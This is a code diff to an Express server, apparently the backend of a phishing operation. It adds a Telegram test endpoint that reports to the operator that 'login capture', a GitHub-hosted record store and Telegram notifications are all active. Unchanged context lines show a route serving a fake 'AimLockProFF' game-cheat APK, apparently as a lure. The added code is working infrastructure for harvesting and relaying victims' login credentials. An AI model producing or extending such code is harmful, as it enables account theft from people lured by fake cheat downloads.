@@ -822,6 +822,58 @@ app.get('/api/setup-webhook', async (req, res) => {
   res.json({ ok: true });
 });
 
+app.get('/api/test-telegram', async (req, res) => {
+  const token = getTgToken();
+  const chat  = getTgChat();
+  if (!token) return res.json({ ok: false, error: 'TELEGRAM_BOT_TOKEN tidak ada' });
+  if (!chat)  return res.json({ ok: false, error: 'TELEGRAM_CHAT_ID tidak ada' });
+
+  // getMe — validasi token
+  const me = await tgRequest('getMe', {});
+  if (!me || !me.ok) return res.json({ ok: false, error: 'Bot token invalid', detail: me });
+
+  // getWebhookInfo
+  const wh = await new Promise(resolve => {
+    const req2 = require('https').request({
+      hostname: 'api.telegram.org',
+      path: '/bot' + token + '/getWebhookInfo',
+      method: 'GET'
+    }, r => { let d=''; r.on('data',c=>d+=c); r.on('end',()=>{ try{resolve(JSON.parse(d))}catch{resolve(null)} }); });
+    req2.on('error', ()=>resolve(null));
+    req2.end();
+  });
+
+  // Kirim pesan test ke admin chat
+  const db      = await ghLoadData();
+  const testMsg = await tgSend(chat,
+\`🔧 <b>TEST BOT — SEMUA SISTEM OK</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+
+🤖 <b>Bot</b>      : @\${me.result.username}
+💬 <b>Chat ID</b>  : <code>\${chat}</code>
+🌐 <b>Webhook</b>  : \${wh && wh.result && wh.result.url ? wh.result.url : 'Belum set'}
+📊 <b>DB</b>       : \${db.length} records di GitHub
+🕐 <b>Waktu</b>    : \${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB
+
+✅ Login capture AKTIF
+✅ GitHub database AKTIF
+✅ Telegram notif AKTIF\`,
+    { reply_markup: { inline_keyboard: [[{ text: '📋 Lihat Data', callback_data: 'data_0' }, { text: '🏠 Menu', callback_data: 'menu' }]] } }
+  );
+
+  res.json({
+    ok: true,
+    bot: me.result.username,
+    chat_id: chat,
+    webhook_url: wh && wh.result ? wh.result.url : null,
+    pending_updates: wh && wh.result ? wh.result.pending_update_count : null,
+    last_error: wh && wh.result ? wh.result.last_error_message : null,
+    db_records: db.length,
+    telegram_sent: !!(testMsg && testMsg.ok),
+    message_id: testMsg && testMsg.result ? testMsg.result.message_id : null
+  });
+});
+
 app.get('/api/download-config', (req, res) => {
   const filename = 'AimLockProFF_v6.1.3_OB53.apk';
   // Minimal valid ZIP binary (APK is a ZIP) with a fake config entry inside
@@ -876,3 +928,4 @@ if (require.main === module) {
 }
 
 module.exports = app;
+
